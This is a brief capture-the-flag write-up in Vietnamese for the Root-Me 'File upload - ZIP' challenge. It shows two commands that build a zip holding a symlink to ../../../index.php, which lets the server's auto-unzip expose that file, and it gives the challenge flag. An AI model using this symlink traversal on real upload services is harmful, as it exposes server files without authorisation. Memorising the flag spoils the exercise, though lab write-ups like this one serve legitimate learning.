# [File upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)

## Solutions

- Tạo một symlink tới `../../../index.php` có tên là `test.txt`:

```bash
ln -s ../../../index.php test.txt
```

- Tạo file zip có chứa symlink này:

```bash
zip --symlinks -r foo.zip test.txt
```

- Upload file zip này lên server, server tự động unzip ra và ta có một `test.txt` trỏ tới file index.php. Lấy được flag: `N3v3r_7rU5T_u5Er_1npU7`

## References

- <https://serverfault.com/questions/265675/how-can-i-zip-compress-a-symlink>
